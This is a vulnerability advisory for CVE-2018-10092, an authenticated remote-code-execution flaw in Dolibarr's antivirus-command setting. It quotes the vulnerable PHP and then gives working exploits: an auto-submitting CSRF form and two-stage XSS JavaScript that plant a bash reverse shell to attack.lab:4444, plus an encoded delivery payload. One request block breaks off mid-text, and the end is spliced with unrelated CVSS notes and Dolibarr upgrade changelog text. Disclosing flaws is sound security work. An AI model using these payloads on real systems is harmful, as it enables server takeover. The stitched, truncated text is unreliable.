Subject: [CVE-2018-10092] Dolibarr admin panel authenticated Remote Code
 Execution (RCE) vulnerability

# [CVE-2018-10092] Dolibarr admin panel authenticated Remote Code
Execution (RCE) vulnerability

## Description

Dolibarr is an "Open Source ERP & CRM for Business" used by many
companies worldwide.

It is available through [GitHub](<https://github.com/Dolibarr/dolibarr>)
or as distribution packages (e.g .deb package).

**Threat**

By tricking a logged-in admin into clicking a malicious link, or by
getting admin privileges in some other way, a remote attacker can
achieve remote code execution (RCE) on the target server.

**Expectation**

User input should be filtered to avoid arbitrary OS command injection.

Arbitrary external commands should be defined in a configuration file
which is not editable by an ERP user.

## Vulnerability type

**CVE ID**: CVE-2018-10092

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-78

**CVSS Base Score**: 9.0

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H

## Details

The admin panel allows to define an antivirus command and parameters,
which are run every time a file is uploaded and scanned.

However, it is possible for an authenticated user to specify an
arbitrary command to be run instead of the antivirus scanner. The
injected command would be triggered after uploading a file to scan,
which effectively leads to executing arbitrary code on the server.

The command to be run is stored in the config variables
`MAIN_ANTIVIRUS_COMMAND` and `MAIN_ANTIVIRUS_PARAM`, which can be set by
the admin through the Web interface.

Then, when a file is uploaded by a user, the function
`dol_move_uploaded_file()` (defined in `files.lib.php`) is called:

```php
function dol_move_uploaded_file($src_file, $dest_file, $allowoverwrite,
$disablevirusscan=0, $uploaderrorcode=0, $nohook=0, $varfiles='addedfile')
{
    ... snip ...

    // If we need to make a virus scan
    if (empty($disablevirusscan) && file_exists($src_file))
    {
        $checkvirusarray=dolCheckVirus($src_file);
        if (count($checkvirusarray))
        {
           dol_syslog('Files.lib::dol_move_uploaded_file File
"'.$src_file.'" (target name "'.$dest_file.'") KO with antivirus:
result='.$result.' errors='.join(',',$checkvirusarray), LOG_WARNING);
           return 'ErrorFileIsInfectedWithAVirus:
'.join(',',$checkvirusarray);
        }
    }

    ... snip ...

    return 1;   // Success
}
```

Which calls `dolCheckVirus()`:

```php
function dolCheckVirus($src_file)
{
    global $conf;

    if (! empty($conf->global->MAIN_ANTIVIRUS_COMMAND))
    {
        if (! class_exists('AntiVir')) {
            require_once DOL_DOCUMENT_ROOT.'/core/class/antivir.class.php';
        }
        $antivir=new AntiVir($db);
        $result = $antivir->dol_avscan_file($src_file);
        if ($result < 0)    // If virus or error, we stop here
        {
            $reterrors=$antivir->errors;
            return $reterrors;
        }
    }
    return array();
}
```

Which in turn calls `dol_avscan_file()` (defined in
`antivir.class.php`), where the return value of `getCliCommand()` is
passed to the `exec()` PHP function:

```php
function dol_avscan_file($file)
    {
        global $conf;

        $return = 0;

        if (preg_match('/\.virus$/i', $file))
        {
            $this->errors='File has an extension saying file is a virus';
            return -97;
        }

        $fullcommand=$this->getCliCommand($file);
        //$fullcommand='"c:\Program Files
(x86)\ClamWin\bin\clamscan.exe" --database="C:\Program Files
(x86)\ClamWin\lib" "c:\temp\aaa.txt"';
        $fullcommand.=' 2>&1';      // This is to get error output

        $output=array();
        $return_var=0;
        $safemode=ini_get("safe_mode");
        // Create a clean fullcommand
        dol_syslog("AntiVir::dol_avscan_file Run
command=".$fullcommand." with safe_mode ".($safemode?"on":"off"));
        // Run CLI command. If run of Windows, you can get return with
echo %ERRORLEVEL%
        $lastline=exec($fullcommand, $output, $return_var);

        //print "x".$lastline." - ".join(',',$output)." -
".$return_var."y";exit;

        ... snip ...

        // If return code = 0
        return 1;
    }
```

The `getCliCommand()` routine uses the `MAIN_ANTIVIRUS_COMMAND` to
format the antivirus command to be executed. Even though
`escapeshellarg()` is used, it is possible for this variable to hold
arbitrary shell commands which will be concatenated and executed:

```php
function getCliCommand($file)
    {
        global $conf;

        $maxreclevel = 5 ;          // maximal recursion level
        $maxfiles = 1000;           // maximal number of files to be
scanned within archive
        $maxratio = 200;            // maximal compression ratio
        $bz2archivememlim = 0;      // limit memory usage for bzip2 (0/1)
        $maxfilesize = 10485760;    // archived files larger than this
value (in bytes) will not be scanned

        $command=$conf->global->MAIN_ANTIVIRUS_COMMAND;
        $param=$conf->global->MAIN_ANTIVIRUS_PARAM;

        $param=preg_replace('/%maxreclevel/',$maxreclevel,$param);
        $param=preg_replace('/%maxfiles/',$maxfiles,$param);
        $param=preg_replace('/%maxratio/',$maxratio,$param);
        $param=preg_replace('/%bz2archivememlim/',$bz2archivememlim,$param);
        $param=preg_replace('/%maxfilesize/',$maxfilesize,$param);
        $param=preg_replace('/%file/',trim($file),$param);

        if (! preg_match('/%file/',$conf->global->MAIN_ANTIVIRUS_PARAM))
            $param=$param." ".escapeshellarg(trim($file));

        if (preg_match("/\s/",$command))
$command=escapeshellarg($command); // Use quotes on command. Using
escapeshellcmd fails.

        $ret=$command.' '.$param;
        //$ret=$command.' '.$param.' 2>&1';
        //print "xx".$ret."xx";exit;

        return $ret;
    }
```

## Proof of Concept 1 : Exploiting CSRF control bypass

Dolibarr generates an anti-CSRF token which is not checked by default.
Another control on the `Referer` header is also perfomed (in
`filefunc.inc.php`):

```
// Security: CSRF protection
// This test check if referrer ($_SERVER['HTTP_REFERER']) is same web
site than Dolibarr ($_SERVER['HTTP_HOST'])
// when we post forms (we allow GET to allow direct link to access a
particular page).
// Note about $_SERVER[HTTP_HOST/SERVER_NAME]:
<http://shiflett.org/blog/2006/mar/server-name-versus-http-host>
if (! defined('NOCSRFCHECK') && empty($dolibarr_nocsrfcheck))
{
    if (! empty($_SERVER['REQUEST_METHOD']) &&
$_SERVER['REQUEST_METHOD'] != 'GET' && ! empty($_SERVER['HTTP_HOST'])
    && (empty($_SERVER['HTTP_REFERER']) || !
preg_match('/'.preg_quote($_SERVER['HTTP_HOST'],'/').'/i',
$_SERVER['HTTP_REFERER'])))
    {
        //print 'NOCSRFCHECK='.defined('NOCSRFCHECK').'
REQUEST_METHOD='.$_SERVER['REQUEST_METHOD'].'
HTTP_POST='.$_SERVER['HTTP_HOST'].' HTTP_REFERER='.$_SERVER['HTTP_REFERER'];
        print "Access refused by CSRF protection in main.inc.php.
Referer of form is outside server that serve the POST.\n";
        print "If you access your server behind a proxy using url
rewriting, you might check that all HTTP header is propagated (or add
the line \$dolibarr_nocsrfcheck=1 into your conf.php file).\n";
        die;
    }
    // Another test is done later on token if option
MAIN_SECURITY_CSRF_WITH_TOKEN is on.
}
if (empty($do
```

However, this controlled can be bypassed since the check only ensures
the header contains the server's domain name in its URL. If the victim
application is at `<http://dolibarr.lab>`, requesting from
`<http://attack.lab/dolibar.lab/exploit.html>` would therefore bypass the
control.

By tricking a logged-in admin into clicking our exploit link, we can
therefore make him change the antivirus command to our exploit payload
silently.

Here is a sample exploit page which will change the antivirus scan
command to a reverse shell payload:

```html
<html>
<body>

  <form
action="http://dolibarr.lab:2080/dolibarr/admin/security_file.php"
method="POST" id="form1" target="iframe1">
    <input type="hidden" name="action" value="updateform" />
    <input type="hidden" name="MAIN_UPLOAD_DOC" value="2048" />
    <input type="hidden" name="MAIN_UMASK" value="0664" />
    <input type="hidden" name="MAIN_ANTIVIRUS_COMMAND" value="test" />
    <input type="hidden" name="MAIN_ANTIVIRUS_PARAM" value=";/bin/bash
-c '/bin/bash>/dev/tcp/attack.lab/4444 0>&1 2>&1 &'" />
    <input type="hidden" name="button" value="Modify" />
  </form>
  <iframe style="display: hidden" height="0" width="0" frameborder="0"
name="iframe1"></iframe>

  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

The file is hosted in a `dolibarr.lab:2080` subdirectory so the
`Referer` header will look similar to the following when the admin
visits our page:

```
POST /dolibarr/admin/security_file.php HTTP/1.1
Host: dolibarr.lab:2080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

Hence the request is accepted by the Dolibarr application and the
antivirus command is replaced with our payload. Next time a file is
uploaded, a reverse shell is opened on our attacking machine:

```
POST /dolibarr/admin/security_file.php HTTP/1.1

## Proof of Concept 2 : Exploiting XSS vulnerability

By exploiting the XSS vulnerability on the application, it is possible
to both set the antivirus command and upload a dummy file so as to
trigger our payload immediately.

Here is an exploit code that will update the antivirus command to a
reverse shell payload and trigger it with a file upload.

```php
function stage1()
{
    var xhr = new XMLHttpRequest();
    xhr.open("POST",
"http:\/\/dolibarr.lab:2080\/dolibarr\/admin\/security_file.php", true);
    xhr.setRequestHeader("Accept",
"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhr.setRequestHeader("Content-Type",
"application\/x-www-form-urlencoded");
    xhr.withCredentials = true;
    var body =
"action=updateform&MAIN_UPLOAD_DOC=2048&MAIN_UMASK=0664&MAIN_ANTIVIRUS_COMMAND=test&MAIN_ANTIVIRUS_PARAM=%3B%2Fbin%2Fbash+-c+%27%2Fbin%2Fbash%3E%2Fdev%2Ftcp%2Fattack.lab%2F4444+0%3E%261+2%3E%261+%26%27&button=Modify";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}

function stage2()
{
    var xhr = new XMLHttpRequest();
    xhr.open("POST",
"http://dolibarr.lab:2080\/dolibarr\/admin\/security_file.php", true);
    xhr.setRequestHeader("Content-Type", "multipart\/form-data;
boundary=---------------------------13516173183538375091983714991");
    xhr.withCredentials = true;
    var body =
"-----------------------------13516173183538375091983714991\r\n" +
    "Content-Disposition: form-data; name=\"userfile[]\";
filename=\"test.txt\"\r\n" +
    "Content-Type: text/plain\r\n" +
    "\r\n" +
    "foobar\r\n" +
    "-----------------------------13516173183538375091983714991\r\n" +
    "Content-Disposition: form-data; name=\"sendit\"\r\n" +
    "\r\n" +
    "Send file\r\n" +
    "-----------------------------13516173183538375091983714991--\r\n";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}

stage1();
setTimeout(stage2, 2000);
```

To deliver it, we will hex encode it and paste it into our vulnerable
XSS link:

**hex decoder function**

```php
function hex2a(hex) {var str = "";for(var i = 0; i <
hex.length;i+=2){str += String.fromCharCode(parseInt(hex.substr(i, 2),
16));}return str;}
```

**urlencoded twice**

```
%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%30%25%36%38%25%36%35%25%37%38%25%33%32%25%36%31%25%32%38%25%36%38%25%36%35%25%37%38%25%32%39%25%32%30%25%37%62%25%37%36%25%36%31%25%37%32%25%32%30%25%37%33%25%37%34%25%37%32%25%32%30%25%33%64%25%32%30%25%32%32%25%32%32%25%33%62%25%36%36%25%36%66%25%37%32%25%32%38%25%37%36%25%36%31%25%37%32%25%32%30%25%36%39%25%32%30%25%33%64%25%32%30%25%33%30%25%33%62%25%32%30%25%36%39%25%32%30%25%33%63%25%32%30%25%36%38%25%36%35%25%37%38%25%32%65%25%36%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%62%25%36%39%25%32%62%25%33%64%25%33%32%25%32%39%25%37%62%25%37%33%25%37%34%25%37%32%25%32%30%25%32%62%25%33%64%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%36%36%25%37%32%25%36%66%25%36%64%25%34%33%25%36%38%25%36%31%25%37%32%25%34%33%25%36%66%25%36%34%25%36%35%25%32%38%25%37%30%25%36%31%25%37%32%25%37%33%25%36%35%25%34%39%25%36%65%25%37%34%25%32%38%25%36%38%25%36%35%25%37%38%25%32%65%25%37%33%25%37%35%25%36%32%25%37%33%25%37%34%25%37%32%25%32%38%25%36%39%25%32%63%25%32%30%25%33%32%25%32%39%25%32%63%25%32%30%25%33%31%25%33%36%25%32%39%25%32%39%25%33%62%25%37%64%25%37%32%25%36%35%25%37%34%25%37%35%25%37%32%25%36%65%25%32%30%25%37%33%25%37%34%25%37%32%25%33%62%25%37%64%25%30%61

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

WARNING:
If you enabled (for test) the experimental BlockedLog module before 7.0, you must purge the table llx\_blockedlog becauseway to save data for final version has changed.
Following changes may create regressions for some external modules, but were necessary to make Dolibarr better:\* The methode "cloture" on contract were renamed into "closeAll".\* The method "is\_erasable" of invoice return a value <= 0 if not erasable (value is meaning) instead of always 0. \* The substitution key for reference of objects is now \_\_REF\_\_ whatever is the object (it replaces \_\_ORDERREF\_\_,  \_\_PROPALREF\_\_, ...)\* The substition key \_\_SIGNATURE\_\_ was renamed into \_\_USER\_SIGNATURE\_\_ to follow naming conventions. \* Substitution keys with syntax %XXX% were renamed into \_\_XXX\_\_ to match others.\* Removed old deprecated REST API (APIs found into '/root' section of the REST API explorer in Dolibarr v6).\* Some REST API to access setup features, like dictionaries (country, town, extrafields, ...) were moved into a  common API "/setup".\* The REST API /documents were renamed into /documents/download and /documents/upload. \* Page bank/index.php, bank/bankentries.php and comm/actions/listactions.php were renamed into  bank/list.php, bank/bankentries\_list.php and comm/actions/list.php to follow page naming conventions (so default filter/sort order features can also work for this pages).\* The trigger ORDER\_SUPPLIER\_STATUS\_ONPROCESS was renamed into ORDER\_SUPPLIER\_STATUS\_ORDERED.\* The trigger ORDER\_SUPPLIER\_STATUS\_RECEIVED\_ALL was renamed into ORDER\_SUPPLIER\_STATUS\_RECEIVED\_COMPLETELY.\* The parameter note into method cloture() is added at end of private note (previously in v6, it replaced).\* The parameter $user is now mandatory for method createFromOrder and createFromPropal.\* Removed js library 'fileupload' that was not used by core code.\* Jquery plugin tableDnd updated. You now need to use decodeURI on the return value of tableDnDSerialize()  and add 'td.' to the beginning of the dragHandle match string. \* IE8 and earlier and Firefox 12 and earlier (< 2012) are no more supported. \* The module ExpenseReport use numbering rules that you can setup (like other modules do). If you need to  keep the hard coded numbering rule of expenses report used in 6.0, just add constant EXPENSEREPORT\_USE\_OLD\_NUMBERING\_RULE to 1.\* If you use the external module "multicompany", you must also upgrade the module. Multicompany module for Dolibarr v7 is required because with Dolibarr v7, payment modes and payment conditions are management as data that are dedicated to each company. If you keep your old version of multicompany module, mode and condition of payments will appears empty in all companies that are not the first one. By upgrading the  multicompany module to a version that support Dolibarr v7, everything should work as expected.

WARNING:
Following changes may create regression for some external modules, but were necessary to make Dolibarr better:\* The hook getNodeList has been replaced by a normalized 'addreplace' hook getDirList.\* The trigger USER\_SETINGROUP and USER\_REMOVEFROMGROUP has been replaced with trigger USER\_MODIFY.\* The page societe/soc.php was renamed into societe/card.php to match page naming conventions.\* The page compta/facture.php was renamed into compta/facture/card.php to match page naming conventions.\* The signature of method ->delete() of class Product and PriceExpression was changed from  ->delete(id, notrigger) to ->delete(User, notrigger) to match standard dev rules.\* The signature of method ->delete() of class Adherent was changed from  ->delete(id) to ->delete(id, User, notrigger) to match standard dev rules.\* Removed CommonObject::displayMarginInfos (was deprecated in 3.8). Use same method into html.formmargin.class.php\* Removed Societe::set\_commnucation\_level (was deprecated in 4.0). Was not used.\* Removed the trigger file of PAYPAL module that stored data that was not used by Dolibarr. The trigger event still exists, but if an external module need action on it, it must provides itself its trigger file.\* Use $conf->global->MULTICOMPANY\_TRANSVERSE\_MODE instead $conf->multicompany->transverse\_mode. So, if you set var $multicompany\_transverse\_mode to 1 into your conf file, you must remove this line and a new key into  the Home - setup - other admin page.\* If you use Multicompany transverse mode, it will be necessary to check the activation of the modules in the children entities and to review completely the rights of the groups and the users.\* Use getEntity('xxx') instead getEntity('xxx', 1) and use getEntity('xxx', 0) instead getEntity('xxx')\* Some other change were done in the way we read permission of a user when module multicompany is enabled. You can  retreive the old behavior by adding constant MULTICOMPANY\_BACKWARD\_COMPATIBILITY to 1.\* The hook formObjectOptions was not implemented correctly in previous version. Sometimes, you had to return output content by doing a print into function, sometimes by returning content into "resprint". This has been fixed to followhook specifications so you must return output into "resprint".
